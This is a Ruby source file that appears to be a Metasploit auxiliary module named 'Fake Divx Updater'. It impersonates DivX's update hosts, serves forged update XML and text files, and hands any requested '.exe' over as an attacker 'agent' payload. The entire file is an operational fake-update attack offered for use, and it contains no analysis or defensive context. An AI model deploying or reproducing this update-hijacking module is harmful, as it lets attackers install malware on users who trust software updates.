require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Divx  Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Divx Player updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		@base = {	
			'vh' => ['versions.divx.com','download.divx.com'],
			'request' => [{
				'req' => '(/AutoUpdate/AutoUpdate-1.1.1.xml)', 
				'type' => 'file', 
				'header' => 'application/xml',
				'bin'    => 1,
				'string' => '', 
				'parse' => 1,
				'file' => 'divx.xml',
			},
			{
				'req' => '(/AutoUpdate/DivxPlayer.txt)', 
				'type' => 'file', 
				'bin'    => 0,
				'string' => '', 
				'parse' => 1,
				'file' => 'divx.txt',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			},
			{
				'req' => '(/hint)', 
				'type' => 'string',
				'method' => '', 
				'bin'    => 0,
				'string' => 'OK', 
				'parse' => 0,
				'file' => '',
			}
			],
			'options' => {
				'version'  => { 
					'val' => '7.1.7',
					'dynamic' => 0 
				},
			}
		}
	end
end
